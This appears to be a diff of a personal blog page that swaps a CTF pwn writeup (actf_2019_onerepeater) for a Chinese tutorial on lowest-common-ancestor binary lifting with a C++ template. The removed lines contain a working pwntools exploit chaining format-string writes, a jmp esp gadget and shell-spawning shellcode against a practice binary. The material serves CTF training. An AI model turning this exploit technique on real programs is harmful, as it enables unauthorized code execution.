@@ -15,15 +15,15 @@
 
 
 
-<meta name="description" content="buu刷题记录，actf_2019_onerepeater">
+<meta name="description" content="最近来复习一遍图论的板子——LCA。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="actf_2019_onerepeater writeup">
-<meta property="og:url" content="http://example.com/2022/02/02/actf_2019_onerepeater%20writeup/index.html">
+<meta property="og:title" content="最近公共祖先求解">
+<meta property="og:url" content="http://example.com/2022/02/11/LCA%E8%AF%A6%E8%A7%A3/index.html">
 <meta property="og:site_name" content="xia0ji233&#39;s blog">
-<meta property="og:description" content="buu刷题记录，actf_2019_onerepeater">
+<meta property="og:description" content="最近来复习一遍图论的板子——LCA。">
 <meta property="og:locale">
-<meta property="article:published_time" content="2022-02-01T18:00:00.000Z">
-<meta property="article:modified_time" content="2022-02-02T12:26:28.320Z">
+<meta property="article:published_time" content="2022-02-11T03:00:00.000Z">
+<meta property="article:modified_time" content="2022-02-11T13:39:52.424Z">
 <meta property="article:author" content="xia0ji233">
 <meta name="twitter:card" content="summary">
 
@@ -59,7 +59,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>actf_2019_onerepeater writeup | xia0ji233&#39;s blog</title>
+<title>最近公共祖先求解 | xia0ji233&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -202,11 +202,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-actf_2019_onerepeater writeup" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-LCA详解" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2022/02/02/actf_2019_onerepeater%20writeup/" class="article-date">
-      <time datetime="2022-02-01T18:00:00.000Z" itemprop="datePublished">2022-02-02</time>
+      <a href="/2022/02/11/LCA%E8%AF%A6%E8%A7%A3/" class="article-date">
+      <time datetime="2022-02-11T03:00:00.000Z" itemprop="datePublished">2022-02-11</time>
 </a>
 
 
@@ -221,7 +221,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      actf_2019_onerepeater writeup
+      最近公共祖先求解
     </h1>
   
 
@@ -230,7 +230,7 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/ctf/">ctf</a><a class="article-category-link" href="/categories/ctf/pwn/">pwn</a>
+    <a class="article-category-link" href="/categories/icpc/">icpc</a><a class="article-category-link" href="/categories/icpc/%E5%9B%BE%E8%AE%BA/">图论</a><a class="article-category-link" href="/categories/icpc/%E5%9B%BE%E8%AE%BA/LCA/">LCA</a>
     </div>
 
 
@@ -242,45 +242,23 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>buu刷题记录，<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#actf_2019_onerepeater">actf_2019_onerepeater</a></p>
+        <p>最近来复习一遍图论的板子——LCA。</p>
 <span id="more"></span>
 
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>拿到elf文件<code>checksec</code>一波，无任何保护，栈可执行，那么多半是要把程序流劫持到栈上执行<code>shellcode</code>了，拖进ida里面。</p>
-<p>![1](actf_2019_onerepeater writeup/1.png)</p>
-<p>逻辑比较简单，菜单题，然后选项2是明显的格式化字符串漏洞，1选项就是读入<code>0x400</code>字节的数据。首先找到<code>jmp esp</code>的<code>gadget</code>。</p>
-<p>![2](actf_2019_onerepeater writeup/2.png)</p>
-<p>有就很好办了，利用格式化字符串改掉返回地址为这个gadget，然后再在后面写一个跳板指令跳到缓冲区内，只要在退出之前把缓冲区写上shellcode就可以很快<code>get shell</code>了。</p>
-<p>先通过测试偏移，发现buf在格式化字符串函数的第16个参数。</p>
-<p>![3](actf_2019_onerepeater writeup/3.png)</p>
-<p>那么我们先把返回地址劫持了再说，经过调试发现返回地址在buf+0x41c的位置上。</p>
-<p>写出部分exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jmp_esp=<span class="number">0x08048907</span><span class="comment"># : jmp esp</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    byte=jmp_esp&amp;<span class="number">0xff</span></span><br><span class="line">    jmp_esp&gt;&gt;=<span class="number">8</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(byte).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x41c</span>+i)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"><span class="comment">#print(hex(len(payload)))</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><strong>最近公共祖先</strong>（英语：lowest common ancestor）是指在一个<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%A0%91_(%E5%9B%BE%E8%AE%BA)">树</a>或者<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%9C%89%E5%90%91%E6%97%A0%E7%8E%AF%E5%9B%BE">有向无环图</a>中同时拥有<em>v</em>和<em>w</em>作为后代的最深的节点。在这里，我们定义一个节点也是其自己的后代，因此如果<em>v</em>是<em>w</em>的后代，那么<em>w</em>就是<em>v</em>和<em>w</em>的最近公共祖先。(fron wiki)</p>
+<h3 id="算法设计"><a href="#算法设计" class="headerlink" title="算法设计"></a>算法设计</h3><p>我们先来看看应该怎么解决此类问题。</p>
+<h4 id="一般思路"><a href="#一般思路" class="headerlink" title="一般思路"></a>一般思路</h4><p>在一个树上，我们定义离根节点最远的与a,b相同的祖先为最近公共祖先(LCA)。我们需要怎么做呢，首先肯定是 dfs 跑一遍，把所有的点的层次遍历出来，时间复杂度为 $O(N)$。一般情况下 $LCA$ 问题会有多次询问，询问次数一般为 $q&lt;10^5$ ，那么就意味着我们不能在线性时间内去计算 $LCA$，如果采取最朴素的方法：选定2个点，若深度不一样则先转为深度一样，深度较深的点不停求它的父亲节点直到深度一样，然后用如下代码去求解。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LCA</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(a!=b)&#123;</span><br><span class="line">		a=pre[a];</span><br><span class="line">		b=pre[b];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="部分汇编知识"><a href="#部分汇编知识" class="headerlink" title="部分汇编知识"></a>部分汇编知识</h2><p>这里需要讲一讲汇编的知识了，因为我们在<code>jmp esp</code>的时候<code>esp</code>是指向我们返回地址的后面一格，所以<code>eip</code>等会会指向<code>ret_addr+4</code>的位置上，那么这个位置我们写些什么呢，当然直接写<code>shellcode</code>是肯定没问题的，实际操作也不会太难，一个循环解决，但是当复杂起来的时候这个就有点难，所以再需要一个跳板指令执行<code>jmp buf</code>，这里我们讲讲<code>jmp</code>的实现，<code>jmp</code>的编码是<code>5</code>个字节，其实有分大跳小跳，小跳只要两个字节，但是只能跳前后<code>0x7f</code>以内的位置。这里要跳到<code>buf</code>显然要用大跳了，大跳的编码是<code>e8</code> 后面跟上小端的<code>int</code>字节序。这个<code>int</code>字节呢代表偏移。</p>
-<p>平时我们看到的<code>jmp 0x400689</code>这些实际编码都不是这样子编码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8 89 06 40 00</span><br></pre></td></tr></table></figure>
-
-<p>而是会根据这个指令所处的位置，然后计算下一条指令到我要跳转的指令位置的数值作为jmp的参数。</p>
-<p>举个例子，假如这个jmp 0x400689所处的位置是0x400500。那么它的编码将是</p>
-<p>0x400689-(0x400500+5)=0x134</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8 34 01 00 00</span><br></pre></td></tr></table></figure>
-
-<p>这样子得到的。</p>
-<p>如果是往低地址跳那就用负数表示。</p>
-<p>这里呢我们要往<code>buf</code>跳，也就是低地址跳转，那么我们指令的位置是<code>buf+0x420</code>，所以得到偏移<code>0x425</code>，因为指令长度占了五个，跳转的起始位置是执行完这个指令的下一个位置。</p>
-<p>取负数得到<code>0xfffffbdb</code>。</p>
-<p>我们就得到了跳板指令的编码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8 db fb ff ff</span><br></pre></td></tr></table></figure>
-
-<p>同样在下方部署这些字节。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">b&#x27;\xe9\xdb\xfb\xff\xff&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    w=shellcode[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(w))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(w).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x420</span>+i)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>那么最后指令就会跳转到<code>buf</code>上，在选择3之前在<code>buf</code>上填一遍<code>shellcode</code>就完事了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.send(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x80486FA\nb *0x80487C6&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>![4](actf_2019_onerepeater writeup/4.png)</p>
-<p>可以看到通过两次跳转，程序成功执行到了<code>shellcode</code>，然后就愉快的<code>cat flag</code> 吧</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port=<span class="number">9999</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,port)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">1</span>,<span class="string">&#x27;./ACTF_2019_OneRepeater&#x27;</span>,port=<span class="number">26602</span>)</span><br><span class="line"></span><br><span class="line">jmp_esp=<span class="number">0x08048907</span><span class="comment"># : jmp esp</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    byte=jmp_esp&amp;<span class="number">0xff</span></span><br><span class="line">    jmp_esp&gt;&gt;=<span class="number">8</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(byte).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x41c</span>+i)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"><span class="comment">#print(hex(len(payload)))</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&#x27;\xe9\xdb\xfb\xff\xff&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    w=shellcode[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(w))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(w).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x420</span>+i)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.send(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendlineafter(&#x27;Exit&#x27;,b&#x27;3&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x80486FA\nb *0x80487C6&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>这样当然可以，而且非常符合最近公共祖先的定义，只是只需要稍微构造一下数据就可以 $T$ 到飞起。</p>
+<h4 id="正确思路"><a href="#正确思路" class="headerlink" title="正确思路"></a>正确思路</h4><p>有一点不难发现：如果我和你有一个公共祖先，则公共祖先的祖先一定也是我们的公共祖先。比如亲兄弟之间，它们的公共祖先就是它们的父母（这里我们假设父母是一个人，爷爷奶奶姥姥姥爷等也是一个人），父母的祖先也就是爷爷奶奶它们同样也是这亲兄弟的公共祖先。再有一个，如果我们两个人的父亲不相同，则我们的公共祖先也等于我们父亲之间的公共祖先，这个都是能直接得到的结论。那么它在一定意义上是有序的，我们就可以采用倍增+二分的思路。</p>
+<p>假设 $fa[a][k]$ 为差 $a$ 点 $2^k$ 辈的祖先，$fa[a][0]$ 就表示 $a$ 的父亲。在搜索的时候我们先观察节点所在的深度然后取得离他们最远的公共祖先。也就是 $fa[a][log_2deep[a]]$ </p>
+<p>但是你可能会发现，如果深度为7，那么它最多只能往上找 $4$ 个祖先，而如果公共祖先刚好是根节点，那么怎么办呢？那么我们不选择缩小区间，而是把 $a,b$ 当成新的对象来算公共祖先。那你有会发现，如果再往上找4个，那么会没有这个值，那怎么办呢？其实我们不需要它有，我们只需要它相等即可。因为根节点一定是所有节点之间的公共祖先，所以我们直接就这么找，找到相等区间往里面缩小一半，就往上找2个祖先，这时候可以发现刚好在根节点之前，如果它们的最近公共祖先是根节点，那么同理，这次寻找又会往上再找两个祖先。又跑到了根节点之外，判断相等，区间缩小为1。区间缩小为1的时候退出循环，此时我们要找的最近公共祖先就在当前点的父亲节点。</p>
+<p>不知道这是否能解决你在运用倍增法求 $LCA$ 的疑惑。</p>
+<p>可以看到每次以树的高度为范围，区间缩小一半地求，效率是非常高的。求一次 $LCA$ 的时间复杂度仅仅为 $log_2n$。</p>
+<h2 id="题目练手"><a href="#题目练手" class="headerlink" title="题目练手"></a>题目练手</h2><p><a target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P3379">洛谷P3379</a> </p>
+<p>标版，直接打就完事了。这里需要注意一下，如果深度不一样那么先平衡深度这个操作，这个操作我们并不是也要一个一个平衡的，也可以用倍增的思路。我先算出两深度之差，把差拆分为二进制比特位，如果从第往高第 $i$ 位为 $1$，那么我就往前寻找 $2^i$ 个祖先，而从当前点往前寻找 $2^i$ 个祖先我们可以直接用 $fa[now][i]$ 来快速求得。如果它构造特殊数据，那么直接一位一位往前寻找平衡深度可能会导致超时。</p>
+<h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 500005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">	<span class="keyword">int</span> to;</span><br><span class="line">	<span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],cnt,lg[maxn],n,q,s;</span><br><span class="line"><span class="keyword">int</span> fa[maxn][<span class="number">25</span>],depth[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">	edge[++cnt].to=y;</span><br><span class="line">	edge[cnt].next=root[x];</span><br><span class="line">	root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> p)</span></span>&#123;</span><br><span class="line">	fa[now][<span class="number">0</span>]=p;</span><br><span class="line">	depth[now]=depth[p]+<span class="number">1</span>;</span><br><span class="line">	<span class="comment">//printf(&quot;point=%d deep=%d\n&quot;,now,depth[now]);</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=lg[depth[now]];i++)&#123;</span><br><span class="line">		fa[now][i]=fa[fa[now][i<span class="number">-1</span>]][i<span class="number">-1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=root[now];i;i=edge[i].next)&#123;</span><br><span class="line">		<span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">		<span class="keyword">if</span>(to!=p)</span><br><span class="line">			<span class="built_in">dfs</span>(to,now);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LCA</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(depth[a]&gt;depth[b])&#123;</span><br><span class="line">		<span class="built_in">swap</span>(a,b);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> x=depth[b]-depth[a];</span><br><span class="line">	<span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">	<span class="comment">//printf(&quot;a=%d,b=%d\n&quot;,a,b);</span></span><br><span class="line">	<span class="keyword">while</span>(x)&#123;</span><br><span class="line">		<span class="keyword">if</span>(x&amp;<span class="number">1</span>)&#123;</span><br><span class="line">			b=fa[b][k];</span><br><span class="line">		&#125;</span><br><span class="line">		k++;</span><br><span class="line">		x&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//printf(&quot;deep=%d\n&quot;,depth[b]);</span></span><br><span class="line">	k=lg[depth[a]];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d\n&quot;</span>,a,b);</span><br><span class="line">	<span class="keyword">while</span>(k!=<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;k=%d\n&quot;</span>,k);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d\n&quot;</span>,fa[a][k],fa[b][k]);</span><br><span class="line">		<span class="keyword">if</span>(fa[a][k]==fa[b][k])k--;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			a=fa[a][k];</span><br><span class="line">			b=fa[b][k];</span><br><span class="line">			<span class="comment">//k=lg[depth[a]];</span></span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(a==b)<span class="keyword">return</span> a;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> fa[a][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin&gt;&gt;n&gt;&gt;q&gt;&gt;s;</span><br><span class="line">	lg[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(i&gt;&gt;(lg[i<span class="number">-1</span>]+<span class="number">1</span>))lg[i]=lg[i<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span> lg[i]=lg[i<span class="number">-1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">		<span class="keyword">int</span> x,y;</span><br><span class="line">		cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">		<span class="built_in">add</span>(x,y);</span><br><span class="line">		<span class="built_in">add</span>(y,x);</span><br><span class="line">	&#125;</span><br><span class="line">	depth[s]=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">dfs</span>(s,s);</span><br><span class="line">	<span class="keyword">while</span>(q--)&#123;</span><br><span class="line">		<span class="keyword">int</span> a,b;</span><br><span class="line">		cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">LCA</span>(a,b));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
       
@@ -290,13 +268,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2022/02/02/actf_2019_onerepeater%20writeup/">actf_2019_onerepeater writeup</a></p>
+        <p><span>本文标题:</span><a href="/2022/02/11/LCA%E8%AF%A6%E8%A7%A3/">最近公共祖先求解</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">xia0ji233</a></p>
-        <p><span>发布时间:</span>2022-02-02, 02:00:00</p>
-        <p><span>最后更新:</span>2022-02-02, 20:26:28</p>
+        <p><span>发布时间:</span>2022-02-11, 11:00:00</p>
+        <p><span>最后更新:</span>2022-02-11, 21:39:52</p>
         <p>
